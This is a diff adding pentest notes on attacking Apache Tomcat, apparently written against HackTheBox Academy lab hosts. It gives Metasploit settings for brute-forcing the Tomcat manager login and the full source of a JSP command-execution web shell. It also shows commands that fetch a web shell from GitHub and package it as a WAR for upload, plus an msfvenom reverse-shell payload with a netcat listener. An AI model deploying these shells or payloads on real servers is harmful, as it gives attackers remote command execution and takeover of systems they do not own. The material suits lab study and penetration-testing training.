@@ -164,3 +164,92 @@ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/w
 
 ### Login Brute Force
 
+
+
+### Login Brute Force
+
+Can be achieved via metasploit, burp intruder or any number of tools (hydra, ffuf, etc)
+
+Metasploit Module: [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)
+
+Make sure to set Stop on success to true so you dont miss it:&#x20;
+
+```shell-session
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
+```
+
+### Tomcat Manager & WAR File Upload
+
+A WAR (Web Application Archive) File is used to quickly deploy web applications and backup storage. Users with the manager-gui role are able to access /manager/html and deploy these files. These can be used to deploy malicious code and gain code execution on the web server.&#x20;
+
+#### Creating Payload Manually&#x20;
+
+gcreate file:&#x20;
+
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+
+```shell-session
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp 
+```
+
+Click on `Browse` to select the .war file and then click on `Deploy`.
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.
+
+<i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i>![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)
+
+To access the web shell on the Tomcat server, navigate to `http://web01.inlanefreight.local:8180/backup/cmd.jsp`.
+
+#### Create Payload with MSFVenom
+
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.7 LPORT=1234 -f war > shell.war`
+
+`nc -nvlp 1234`
+
+#### Auto-Exploit with Metapsloit
+
+{% embed url="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/" %}
+
+#### JSP web shell
+
+{% embed url="https://github.com/SecurityRiskAdvisors/cmd.jsp" %}
